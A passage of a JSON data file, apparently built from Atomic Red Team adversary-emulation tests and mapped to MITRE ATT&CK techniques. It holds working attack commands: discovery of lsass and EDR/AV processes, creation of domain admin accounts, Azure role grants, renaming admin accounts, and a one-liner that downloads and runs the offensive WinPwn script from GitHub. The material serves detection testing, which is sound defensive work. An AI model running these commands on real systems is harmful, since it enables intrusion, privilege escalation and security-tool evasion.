            "description": "Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.",
            "command": "docker build -t t1069 $PathtoAtomicsFolder/T1069.001/src/; docker run --name t1069_container  -d -t t1069; docker exec t1069_container ./test.sh"
         },
         {
            "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
            "command": "get-localgroup; Get-LocalGroupMember -Name \"Administrators\""
         },
         {
            "description": "Summary of permission and security groups",
            "command": "gpresult /R\n"
         }
      ]
   },
   "T1613": {
      "technique_name": "Container and Resource Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Adversaries may attempt to discover containers and other resources that are available within a containers environment.",
            "command": "docker build -t t1613  $PathtoAtomicsFolder/T1613/src/; docker run --name t1613_container  -d -t t1613; docker ps; docker stats --no-stream; docker inspect $(docker ps -l -q --filter ancestor=t1613)"
         }
      ]
   },
   "T1057": {
      "technique_name": "Process Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Utilize windows management instrumentation to identify processes.\n\nUpon successful execution, WMIC will execute process to list processes. Output will be via stdout. \n",
            "command": "wmic process get /format:list"
         },
         {
            "description": "Utilize ps to identify processes.\n\nUpon successful execution, sh will execute ps and output to /tmp/loot.txt.\n",
            "command": "ps >> /tmp/loot.txt; ps aux >> /tmp/loot.txt"
         },
         {
            "description": "Utilize tasklist to identify processes.\n\nUpon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout. \n",
            "command": "tasklist"
         },
         {
            "description": "Utilize Get-Process PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. \n",
            "command": "Get-Process"
         },
         {
            "description": "Utilize get-wmiObject PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute get-wmiObject to list processes. Output will be via stdout. \n",
            "command": "get-wmiObject -class Win32_Process"
         },
         {
            "description": "Adversaries may use command line tools to discover specific processes in preparation of further attacks. \nExamples of this could be discovering the PID of lsass.exe to dump its memory or discovering whether specific security processes (e.g. AV or EDR) are running.\n",
            "command": "tasklist | findstr lsass"
         },
         {
            "description": "Discovers processes that the current user has the ability to access and selects an injectable one",
            "command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json\n"
         },
         {
            "description": "Enumerate running virtual machines on hypervisor",
            "command": "acrnctl list\n"
         },
         {
            "description": "Get process info for processes running as a user",
            "command": "ps aux | grep #{host.user.name}\n"
         },
         {
            "description": "Display information about current system processes",
            "command": "ps\n"
         },
         {
            "description": "Capture running processes and their loaded DLLs",
            "command": "tasklist /m  >> $env:APPDATA\\vmtool.log;\ncat $env:APPDATA\\vmtool.log\n"
         },
         {
            "description": "Get process info for LSASS",
            "command": "$ps = get-process | select processname,Id;\n$valid = foreach($p in $ps) { if($p.ProcessName -eq \"lsass\") {$p} };\n$valid | ConvertTo-Json\n"
         },
         {
            "description": "Capture running processes via PowerShell",
            "command": "get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"
         },
         {
            "description": "Identify system processes",
            "command": "Get-Process"
         },
         {
            "description": "Process discovery via SysInternals pstool",
            "command": "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;\niex $staging_folder\"\\pslist.exe\" >> $env:LOCALAPPDATA\\output.log;\nRemove-Item $download_folder\"PSTools.zip\";\nRemove-Item $staging_folder -Recurse\n"
         }
      ]
   },
   "T1518.001": {
      "technique_name": "Software Discovery: Security Software Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV/Security software it is running.\n",
            "command": "ps aux | egrep 'Little\\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu'"
         },
         {
            "description": "Windows Defender Enumeration via different built-in windows native tools.\nwhen sucessfully executed, information about windows defender is displayed.\n",
            "command": "Get-Service WinDefend; Get-MpComputerStatus; Get-MpThreat"
         },
         {
            "description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV/Security software it is running.\n",
            "command": "ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd'"
         },
         {
            "description": "Discovery of an installed Sysinternals Sysmon service using driver altitude (even if the name is changed).\n\nwhen sucessfully executed, the test is going to display sysmon driver instance if it is installed.\n",
            "command": "fltmc.exe | findstr.exe 385201"
         },
         {
            "description": "Discovery of installed antivirus products via Get-CimInstance and Get-WmiObject cmdlets of powershell.\n\nwhen sucessfully executed, information about installed AV software is displayed..\n",
            "command": "powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct && powershell Get-WmiObject -Namespace root\\securitycenter2 -Class antivirusproduct"
         },
         {
            "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, powershell is going to processes related AV products if they are running.\nNote that, depending on the privilege of current user, get-process | ?{$_.Description -like \"*\"} may not return the processes related to AV products of the check.\nFor instance, only with Administrator right, you can see the process description of McAffee processes. Hence, it is better to use get-process | ?{$_.ProcessName -like \"*\"},\nif you know the name of those processes.\n",
            "command": "get-process | ?{$_.Description -like \"*virus*\"}; get-process | ?{$_.Description -like \"*carbonblack*\"}; get-process | ?{$_.Description -like \"*defender*\"}; get-process | ?{$_.Description -like \"*cylance*\"}; get-process | ?{$_.Description -like \"*mc*\"}; get-process | ?{$_.ProcessName -like \"*mc*\"}; get-process | Where-Object { $_.ProcessName -eq \"Sysmon\" }"
         },
         {
            "description": "Discovery of installed antivirus products via a WMI query.\n\nwhen sucessfully executed, the test is going to display installed AV software.\n",
            "command": "wmic.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List"
         },
         {
            "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, the test is going to display running processes, firewall configuration on network profiles\nand specific security software.\n",
            "command": "netsh.exe advfirewall  show allprofiles  && netsh.exe advfirewall firewall dump && netsh.exe advfirewall show currentprofile && netsh.exe advfirewall firewall show rule name=all && netsh.exe firewall show state && netsh.exe firewall show config && sc query windefend && powershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\" && powershell.exe /c \"Get-Service | where-object {$_.DisplayName -like '*sysm*'}\" && powershell.exe /c \"Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''\" && tasklist.exe && tasklist.exe | findstr /i virus && tasklist.exe | findstr /i cb && tasklist.exe | findstr /i defender && tasklist.exe | findstr /i cylance && tasklist.exe | findstr /i mc && tasklist.exe | findstr /i \"virus cb defender cylance mc\""
         },
         {
            "description": "Enumerates windows firewall to retrieves firewall rules from the target computer.\n\nwhen sucessfully executed, details of windows firewall is displayed.\n",
            "command": "Get-NetFirewallProfile | Format-Table Name, Enabled; Get-NetFirewallSetting; Get-NetFirewallRule | select DisplayName, Enabled, Description"
         },
         {
            "description": "Identify AV",
            "command": "find /Applications/ -maxdepth 2 -iname *.app | grep -io \"[a-z ]*\\.app\" | grep -Ei -- \"symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)\"\n"
         },
         {
            "description": "Identify Firewalls",
            "command": "$NameSpace = Get-WmiObject -Namespace \"root\" -Class \"__Namespace\" | Select Name | Out-String -Stream | Select-String \"SecurityCenter\";\n$SecurityCenter = $NameSpace | Select-Object -First 1;\nGet-WmiObject -Namespace \"root\\$SecurityCenter\" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;\n"
         },
         {
            "description": "Determine whether or not UAC is enabled",
            "command": "echo $(get-uac)\n"
         }
      ]
   },
   "T1007": {
      "technique_name": "System Service Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Enumerates started system services using net.exe and writes them to a file. This technique has been used by multiple threat actors.\n\nUpon successful execution, net.exe will run from cmd.exe that queries services. Expected output is to a txt file in in the temp directory called service-list.txt.\n",
            "command": "net.exe start >> %temp%\\service-list.txt"
         },
         {
            "description": "Identify system services.\n\nUpon successful execution, cmd.exe will execute service commands with expected result to stdout.\n",
            "command": "tasklist.exe && sc query && sc query state= all"
         },
         {
            "description": "Enumerates system service using systemctl\n",
            "command": "systemctl --type=service"
         },
         {
            "description": "Identify system services",
            "command": "Get-Service"
         }
      ]
   },
   "T1526": {
      "technique_name": "Cloud Service Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Upon successful execution, this test will enumerate all resources that are contained within a valid Azure subscription. \nThe resources enumerated will display on screen, as well as several csv files and folders will be output to a specified directory, listing what resources were discovered by the script. \nSee https://dev.to/cheahengsoon/enumerating-subscription-information-with-microburst-35a1\n",
            "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzDomainInfo.ps1\"; $Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"None\", $Password; Connect-AzAccount -Credential $Credential | out-null; Get-AzDomainInfo -folder $env:temp\\T1526Test1 -subscription \"None\" -verbose"
         }
      ]
   },
   "T1619": {
      "technique_name": "Cloud Storage Object Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "This test will enumerate all the S3 buckets in the user account and lists all the files in each bucket. \n",
            "command": "for bucket in \"$(aws s3 ls | cut -d \" \" -f3)\"; do aws s3api list-objects-v2 --bucket $bucket --output text; done"
         }
      ]
   },
   "T1580": {
      "technique_name": "Cloud Infrastructure Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "This atomic runs several API calls (sts:GetCallerIdentity, s3:ListBuckets, iam:GetAccountSummary, iam:ListRoles, iam:ListUsers, iam:GetAccountAuthorizationDetails, ec2:DescribeSnapshots, cloudtrail:DescribeTrails, guardduty:ListDetectors) from the context of an EC2 instance role. This simulates an attacker compromising an EC2 instance and running initial discovery commands on it. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/\n",
            "command": "if test -f \"$PathToAtomicsFolder/T1580/src/stratus\"; then : ; else if [ \"$(uname)\" = \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1580/src/; elif [ \"$(expr substr $(uname) 1 5)\" = \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i linux_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1580/src/; fi; fi;  ;  export AWS_REGION=us-west-2; cd $PathToAtomicsFolder/T1580/src; echo \"Stratus: Start Warmup.\"; ./stratus warmup aws.discovery.ec2-enumerate-from-instance; echo \"Stratus: Start Detonate.\"; ./stratus detonate aws.discovery.ec2-enumerate-from-instance"
         }
      ]
   },
   "T1120": {
      "technique_name": "Peripheral Device Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Search for printers / potential vulns using printercheck function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); printercheck -noninteractive -consoleoutput"
         },
         {
            "description": "Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity",
            "command": "Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\\T1120_collection.txt; $Space,$Heading,$Break,$Data = Get-Content $env:TEMP\\T1120_collection.txt; @($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \"\" } |Set-Content $env:TEMP\\T1120_collection.txt"
         },
         {
            "description": "find attached usb devices",
            "command": "system_profiler SPUSBDataType\n"
         },
         {
            "description": "View details of queued documents in printer queue",
            "command": "lpq -a"
         }
      ]
   },
   "T1010": {
      "technique_name": "Application Window Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Compiles and executes C# code to list main window titles associated with each process.\n\nUpon successful execution, powershell will download the .cs from the Atomic Red Team repo, and cmd.exe will compile and execute T1010.exe. Upon T1010.exe execution, expected output will be via stdout.\n",
            "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:%TEMP%\\T1010.exe \"1b4409_T1010.cs\" && %TEMP%\\T1010.exe"
         },
         {
            "description": "Extracts the names of all open non-explorer windows, and the locations of all explorer windows.",
            "command": "$x = Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | Select-Object MainWindowTitle;\n$a = New-Object -com \"Shell.Application\"; $b = $a.windows() | select-object LocationName;\nwrite-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)"
         }
      ]
   },
   "T1136.002": {
      "technique_name": "Create Account: Domain Account",
      "tactic": "persistence",
      "known implementations": [
         {
            "description": "Use Admin Credentials to Create A Domain Admin Account\n",
            "command": "echo \"dn: CN=Admin User,CN=Users,DC=example,DC=test\\nchangetype: add\\nobjectClass: top\\nobjectClass: person\\nobjectClass: organizationalPerson\\nobjectClass: user\\ncn: Admin User\\nsn: User\\ngivenName: Atomic User\\nuserPrincipalName: adminuser@example.test\\nsAMAccountName: adminuser\\nuserAccountControl: 512\\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\\nmemberOf: CN=Domain Admins,CN=Users,DC=example,DC=test\" > tempadmin.ldif; echo ldapadd -H ldap://example.test:389 -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif; ldapadd -H ldap://example.test:389 -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif"
         },
         {
            "description": "Create a new account similar to ANONYMOUS LOGON in a command prompt.\n",
            "command": "net user \"ANONYMOUS  LOGON\" \"T1136_pass123!\" /add /domain"
         },
         {
            "description": "Creates a new domain admin user in a command prompt.\n",
            "command": "net user \"#{username}\" \"#{password}\" /add /domain && net group \"#{group}\" \"#{username}\" /add /domain"
         },
         {
            "description": "Use Admin Credentials to Create A Normal Account (as means of entry)\n",
            "command": "echo \"dn: cn=Atomic User, cn=Users,dc=example,dc=test\\nobjectClass: person\\ncn: Atomic User\\nsn: User\" > tempadmin.ldif; echo ldapadd -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -f tempadmin.ldif; ldapadd -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -f tempadmin.ldif"
         },
         {
            "description": "Creates a new Domain User using the credentials of the Current User\n",
            "command": "$SamAccountName = 'T1136.002_Admin'; $AccountPassword = ConvertTo-SecureString 'T1136_pass123!' -AsPlainText -Force; Add-Type -AssemblyName System.DirectoryServices.AccountManagement; $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain); $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context); $User.SamAccountName = $SamAccountName; $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword); $User.SetPassword($TempCred.GetNetworkCredential().Password); $User.Enabled = $True; $User.PasswordNotRequired = $False; $User.DisplayName = $SamAccountName; $User.Save(); $User"
         }
      ]
   },
   "T1098": {
      "technique_name": "Account Manipulation",
      "tactic": "persistence",
      "known implementations": [
         {
            "description": "The adversaries want to add service principal to some Azure role, also called Azure resource role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader is assigned to service principal in this test.\n\nNew-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.\n\nThe account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint - check Operation Name \"Create role assignment\" in subscriptions Activity Logs.\n",
            "command": "try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) { ; } else {Install-Module -Name Az.Resources -Force};  ;  Import-Module -Name Az.Resources; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzAccount -Credential $Credential; $sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq \"SuperSP\"}; if ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }; $subscription = Get-AzSubscription | where-object {$_.Name -eq \"Azure subscription 1\"} ; if ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }; $role = Get-AzRoleDefinition | where-object {$_.Name -eq \"Reader\"}; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; New-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription; Write-Host \"Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\""
         },
         {
            "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password.  You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was.\n",
            "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"Uplow-1\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString Uplow-1 -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to Uplow-1\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"Uplow-1\" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }"
         },
         {
            "description": "Adversaries create AWS group, add users to specific to that group to elevate their privilieges to gain more accesss\n",
            "command": "aws iam create-group --group-name; aws iam add-user-to-group --user-name"
         },
         {
            "description": "This Atomic will: \n  - Create a service account\n  - Create a service account key, \n  - Store the result of retrieving a single key for that service account as a variable\n  - Pass that variable for deletion\n  - Delete the service account\n\nThe idea for this Atomic came from a Rule published by the Elastic team.\n\nIdentifies the deletion of an Identity and Access Management (IAM) service account key in Google Cloud Platform (GCP).\nEach service account is associated with two sets of public/private RSA key pairs that are used to authenticate. \nIf a key is deleted, the application will no longer be able to access Google Cloud resources using that key. A security best practice is to rotate your service account keys regularly.\n\nReference: https://github.com/elastic/detection-rules/blob/main/rules/integrations/gcp/impact_gcp_storage_bucket_deleted.toml\n",
            "command": "gcloud config set project atomic-test-1; KEY=`gcloud iam service-accounts keys list --iam-account=atomic-service-account@atomic-test-1.iam.gserviceaccount.com --format=\"value(KEY_ID)\" --limit=1`; gcloud iam service-accounts keys delete $KEY --iam-account=atomic-service-account@atomic-test-1.iam.gserviceaccount.com --quiet"
         },
         {
            "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
            "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"UpperLowerLong-special\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString UpperLowerLong-special -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to UpperLowerLong-special\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UpperLowerLong-special\" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }"
         },
         {
            "description": "Manipulate Admin Account Name\n",
            "command": "$x = Get-Random -Minimum 2 -Maximum 9999; $y = Get-Random -Minimum 2 -Maximum 9999; $z = Get-Random -Minimum 2 -Maximum 9999; $w = Get-Random -Minimum 2 -Maximum 9999; Write-Host HaHa_$x$y$z; $fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match \"User\" -and $_.PrincipalSource -match \"Local\"} | Select Name; foreach($member in $fmm) {;     if($member -like \"*Administrator*\") {;         $account = $member.Name.Split(\"\\\")[-1];         $originalDescription = (Get-LocalUser -Name $account).Description;         Set-LocalUser -Name $account -Description \"atr:$account;$originalDescription\".Substring(0,48);         Rename-LocalUser -Name $account -NewName \"HaHa_$x$y$z\";         Write-Host \"Successfully Renamed $account Account on \" $Env:COMPUTERNAME;         };     }"
         },
         {
            "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
            "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"onlyUPandLowChars\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString onlyUPandLowChars -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to onlyUPandLowChars\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"onlyUPandLowChars\" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }"
         },
         {
            "description": "The adversaries want to add service principal to some Azure AD role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, \nPrivileged Authentication Administrator (this role can reset Global Administrator password!).\nBy default, the role Global Reader is assigned to service principal in this test.\n\nThe account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.\n\nDetection hint - check Activity \"Add member to role\" in Azure AD Audit Logs. In targer you will also see Service Principal as a type.\n",
            "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) { ; } else {Install-Module -Name AzureAD -Force};  ;  Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential; $sp = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'SuperSP'\"; if ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }; $role = Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Reader'\"; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId; Write-Host \"Service Principal $($sp.DisplayName) was added to $($role.DisplayName)\""
         },
         {
            "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
            "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"Spring$((Get-Date).Year)!\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString Spring$((Get-Date).Year)! -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to Spring$((Get-Date).Year)!\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"Spring$((Get-Date).Year)!\" -AsPlainText -Force));     $newCred.Password | 